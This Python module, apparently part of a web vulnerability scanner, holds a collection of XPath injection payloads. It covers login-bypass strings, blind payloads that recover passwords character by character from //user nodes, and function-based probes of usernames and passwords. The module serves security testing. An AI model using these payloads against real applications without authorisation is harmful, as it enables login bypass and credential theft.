"""
XPath Injection payloads
Contains payloads for testing XPath injection vulnerabilities
"""

class XPathInjectionPayloads:
    """XPath Injection payload collection"""
    
    @staticmethod
    def get_all_payloads():
        """Get all XPath injection payloads"""
        return (XPathInjectionPayloads.get_basic_xpath_payloads() + 
                XPathInjectionPayloads.get_blind_xpath_payloads() +
                XPathInjectionPayloads.get_xpath_functions_payloads())
    
    @staticmethod
    def get_basic_xpath_payloads():
        """Get basic XPath injection payloads"""
        return [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "test' and count(/*)=1 and 'test'='test",
            "' or position()=1 or ''='",
            "admin' or '1'='1' or 'admin'='admin",
            "' or text()='admin' or ''='",
            "' or @*[contains(.,'admin')] or ''='",
            "' or contains(name(),'user') or ''='",
            "' or starts-with(name(),'admin') or ''='"
        ]
    
    @staticmethod
    def get_blind_xpath_payloads():
        """Get blind XPath injection payloads"""
        return [
            "' and substring(//user[1]/password,1,1)='a",
            "' and string-length(//user[1]/password)>5 and ''='",
            "' and count(//user)>0 and ''='",
            "' and //user[1] and ''='",
            "' and boolean(//user[position()=1]) and ''='",
            "' and name(/*[1])='root' and ''='",
            "' and local-name(/*[1])='users' and ''='",
            "' and namespace-uri(/*[1])='' and ''='",
            "' and string(//user[1]/@id)='1' and ''='",
            "' and number(//user[1]/@id)=1 and ''='"
        ]
    
    @staticmethod
    def get_xpath_functions_payloads():
        """Get XPath function-based payloads"""
        return [
            "' or contains(//user/password,'admin') or ''='",
            "' or starts-with(//user/username,'admin') or ''='",
            "' or substring(//user/password,1,5)='admin' or ''='",
            "' or string-length(//user/password)=5 or ''='",
            "' or normalize-space(//user/username)='admin' or ''='",
            "' or translate(//user/username,'ADMIN','admin')='admin' or ''='",
            "' or concat(//user/username,//user/password)='adminadmin' or ''='",
            "' or floor(//user/@id)=1 or ''='",
            "' or ceiling(//user/@id)=1 or ''='",
            "' or round(//user/@id)=1 or ''='"
        ]
